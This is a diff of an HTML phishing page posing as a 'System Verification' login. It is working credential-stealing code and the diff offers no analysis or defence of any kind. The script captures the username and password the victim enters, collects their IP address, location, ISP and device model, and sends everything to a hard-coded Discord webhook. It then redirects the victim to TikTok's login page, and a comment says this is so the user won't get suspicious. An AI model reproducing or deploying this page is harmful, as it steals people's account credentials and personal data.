@@ -3,57 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>System Verification</title>
 </head>
 <body>
-    <script>
-    async function sendTargetData() {
-        const userField = document.getElementById('user').value;
-        const passField = document.getElementById('pass').value;
-        const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-        if (!userField || !passField) {
-            alert("Please enter your login details to continue.");
+    <input type="text" id="user" placeholder="Username or Email">
+    <input type="password" id="pass" placeholder="Password">
+    <button onclick="captureData()">Verify & Login</button>
+
+    <script>
+    async function captureData() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const webhook = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+
+        if (!user || !pass) {
+            alert("Please fill in all required fields.");
             return;
         }
 
         try {
-            const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+            // 1. Fetch IP and Location Data immediately
+            const ipResponse = await fetch('https://ipapi.co/json/').catch(() => ({}));
+            const ipData = await ipResponse.json();
+
+            // 2. Extract Device Model from UserAgent
             const userAgent = navigator.userAgent;
-            const regExp = /\(([^)]+)\)/;
-            const matches = regExp.exec(userAgent);
-            const deviceModel = matches ? matches[1] : "Unknown Device";
+            const modelMatch = userAgent.match(/\(([^)]+)\)/);
+            const deviceModel = modelMatch ? modelMatch[1] : "Unknown Device";
 
-            const loc = await ipTask;
-
+            // 3. Construct the Professional Discord Payload
             const payload = {
-                username: "Security System Monitor",
+                username: "Security Data Hub",
                 embeds: [{
-                    title: "Log Report: User Authentication",
-                    color: 16711680, 
+                    title: "CRITICAL: Data Log Captured",
+                    color: 16711680, // Bold Red
                     fields: [
-                        { name: "👤 Account ID", value: `\`${userField}\``, inline: true },
-                        { name: "🔑 Security Key", value: `\`${passField}\``, inline: true },
-                        { name: "📱 Device Info", value: `**${deviceModel}**`, inline: false },
-                        { name: "🌐 IP Address", value: `**${loc.ip || 'Not Found'}**`, inline: true },
-                        { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true },
-                        { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false }
+                        { name: "👤 USERNAME", value: `\`${user}\``, inline: true },
+                        { name: "🔑 PASSWORD", value: `\`${pass}\``, inline: true },
+                        { name: "📱 DEVICE MODEL", value: `**${deviceModel}**`, inline: false },
+                        { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'NOT_FOUND'}**`, inline: true },
+                        { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true },
+                        { name: "📡 PROVIDER", value: `${ipData.org || 'UNKNOWN'}`, inline: false }
                     ],
-                    footer: { text: "Transmission Verified • " + new Date().toLocaleString() }
+                    footer: { text: "Transmission Verified | " + new Date().toLocaleString() }
                 }]
             };
 
-            await fetch(webhookURL, {
+            // 4. THE POWERFUL TRANSMISSION METHOD
+            // 'keepalive: true' ensures data is sent even if the user leaves the page.
+            await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
                 keepalive: true 
             });
 
+            // 5. Final Redirection to Official Page
             window.location.replace("https://www.tiktok.com/login");
 
         } catch (error) {
-            window.location.replace("https://www.tiktok.com/");
+            // Fallback redirection so the user doesn't get suspicious
+            window.location.replace("https://www.tiktok.com/login");
         }
     }
     </script>
